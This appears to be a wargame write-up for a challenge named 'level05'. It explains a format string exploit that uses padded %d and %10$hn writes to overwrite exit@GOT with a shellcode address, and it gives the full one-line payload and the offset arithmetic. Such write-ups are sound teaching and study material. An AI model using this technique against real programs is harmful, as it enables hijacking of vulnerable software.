# Format String Specifiers Explained: %d, %hn, and Padding

This document explains the format specifiers used in level05's format string exploit, specifically what `%55412d` and `%10$hn` mean.

## The Exploit Payload Breakdown

```bash
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55412d%10\$hn' + '%10115d%11\$hn'" | ./level05
```

Let's break this down piece by piece:

```
[Part 1: Addresses]
'\x08\x04\x97\xe0'[::-1]  →  \xe0\x97\x04\x08  (exit@GOT low bytes)
'\x08\x04\x97\xe2'[::-1]  →  \xe2\x97\x04\x08  (exit@GOT+2 high bytes)

[Part 2: Format String]
'%55412d%10$hn'  →  Print 55412 chars, then write to position 10
'%10115d%11$hn'  →  Print 10115 chars, then write to position 11
```

## What is `%d`?

`%d` is a **format specifier** that prints a **decimal integer**.

### Basic Examples:

```c
printf("%d", 42);           // Output: 42
printf("%d", 100);          // Output: 100
printf("%10d", 42);         // Output: "        42" (padded to 10 chars)
printf("%55412d", 42);      // Output: "        ...        42" (padded to 55412 chars!)
```

### In Our Exploit:

```
%55412d
```

This means:
- **`%d`** - Print a decimal integer
- **`55412`** - Minimum field width (pad to 55412 characters)

**What does it print?**
It prints whatever value is on the stack at the current position, padded with spaces to be exactly 55412 characters wide.

## Why Do We Need Padding?

In format string exploits, `%n` (and `%hn`) writes the **number of characters printed so far** to a memory address.

### Example:

```c
int count;
printf("Hello%n", &count);
// count = 5 (because "Hello" is 5 characters)

printf("AAAA%n", &count);
// count = 4 (because "AAAA" is 4 characters)

printf("AAAA%100d%n", 42, &count);
// count = 104 (4 bytes "AAAA" + 100 chars from %100d)
```

### In Our Exploit:

We want to write the value `0xd87c` (55420 in decimal) to `exit@GOT`.

**Calculation:**
```
We've already printed: 8 bytes (the two addresses)
We want total printed: 55420 bytes
Padding needed: 55420 - 8 = 55412 bytes
```

So we use `%55412d` to print 55412 more characters!

## What is `%hn`?

`%hn` is a **format specifier** that writes a **2-byte (short) value** to memory.

### Comparison:

| Specifier | What it does | Bytes written |
|-----------|--------------|---------------|
| `%n` | Write number of chars printed (4 bytes) | 4 bytes (int) |
| `%hn` | Write number of chars printed (2 bytes) | 2 bytes (short) |
| `%hhn` | Write number of chars printed (1 byte) | 1 byte (char) |

### Why `%hn` instead of `%n`?

We're writing a 4-byte address in **two 2-byte chunks**:

```
Target address: 0xffffd87c

Split into:
Low 2 bytes:  0xd87c = 55420 decimal
High 2 bytes: 0xffff = 65535 decimal
```

Writing in 2-byte chunks avoids having to print 4+ billion characters!

## What is `%10$hn`?

The `$` is for **direct parameter access** - it lets you specify which argument to use.

### Basic Examples:

```c
printf("%1$d %2$d %3$d", 10, 20, 30);
// Output: 10 20 30

printf("%3$d %2$d %1$d", 10, 20, 30);
// Output: 30 20 10 (reversed!)

printf("%2$d %2$d %2$d", 10, 20, 30);
// Output: 20 20 20 (same argument three times)
```

### In Our Exploit:

```
%10$hn
```

This means:
- **`%hn`** - Write 2 bytes
- **`10$`** - Use the value at stack position 10

**What's at position 10?**
Our input buffer! Specifically, the first 4 bytes: `\xe0\x97\x04\x08` (the address `0x080497e0`).

So `%10$hn` writes to the address stored at position 10.

## Complete Payload Explanation

```python
'\x08\x04\x97\xe0'[::-1]  # Position 10: 0x080497e0 (exit@GOT)
'\x08\x04\x97\xe2'[::-1]  # Position 11: 0x080497e2 (exit@GOT+2)
'%55412d'                 # Print 55412 chars (total: 8 + 55412 = 55420)
'%10$hn'                  # Write 55420 (0xd87c) to address at position 10
'%10115d'                 # Print 10115 more chars (total: 55420 + 10115 = 65535)
'%11$hn'                  # Write 65535 (0xffff) to address at position 11
```

### Step-by-Step Execution:

1. **Print 8 bytes**: `\xe0\x97\x04\x08\xe2\x97\x04\x08`
   - Characters printed so far: **8**

2. **`%55412d`**: Print a number padded to 55412 characters
   - Characters printed so far: **8 + 55412 = 55420** (0xd87c)

3. **`%10$hn`**: Write 55420 to the address at position 10
   - Writes `0xd87c` to `0x080497e0` (exit@GOT low bytes)

4. **`%10115d`**: Print a number padded to 10115 characters
   - Characters printed so far: **55420 + 10115 = 65535** (0xffff)

5. **`%11$hn`**: Write 65535 to the address at position 11
   - Writes `0xffff` to `0x080497e2` (exit@GOT high bytes)

**Result:** `exit@GOT` now contains `0xffffd87c` (our shellcode address)!

## Format Specifier Cheat Sheet

| Specifier | Meaning | Example | Output |
|-----------|---------|---------|--------|
| `%d` | Print decimal integer | `printf("%d", 42)` | `42` |
| `%10d` | Print decimal, min 10 chars | `printf("%10d", 42)` | `        42` |
| `%x` | Print hexadecimal | `printf("%x", 255)` | `ff` |
| `%s` | Print string | `printf("%s", "hi")` | `hi` |
| `%n` | Write 4-byte count | `printf("AB%n", &x)` | x = 2 |
| `%hn` | Write 2-byte count | `printf("AB%hn", &x)` | x = 2 |
| `%10$d` | Print arg at position 10 | `printf("%2$d", 1, 2)` | `2` |
| `%10$hn` | Write to addr at position 10 | (exploit usage) | Writes to memory |

## Why These Specific Numbers?

### For `%55412d`:

```
Target value (low bytes): 0xd87c = 55420 decimal
Already printed: 8 bytes (the addresses)
Padding needed: 55420 - 8 = 55412
```

### For `%10115d`:

```
Target value (high bytes): 0xffff = 65535 decimal
Already printed: 55420 bytes
Padding needed: 65535 - 55420 = 10115
```

## Visual Representation

```
Memory before exploit:
exit@GOT (0x080497e0): [0x08][0x04][0x83][0x76]  ← Points to exit@PLT

After %10$hn (write 0xd87c to 0x080497e0):
exit@GOT (0x080497e0): [0x7c][0xd8][0x83][0x76]

After %11$hn (write 0xffff to 0x080497e2):
exit@GOT (0x080497e0): [0x7c][0xd8][0xff][0xff]

Final value: 0xffffd87c ← Our shellcode address!
```

## Summary

- **`%d`** = Print a decimal number
- **`%55412d`** = Print a decimal number padded to 55412 characters (for counting)
- **`%hn`** = Write a 2-byte value (the number of characters printed so far)
- **`%10$hn`** = Write to the address stored at stack position 10
- **The `d` is just the format type** - we don't care what number it prints, we only care about the padding!

The `d` in `%55412d` is the format specifier for "decimal integer", but we're using it purely for its **padding capability** to control how many characters are printed before the `%hn` write!

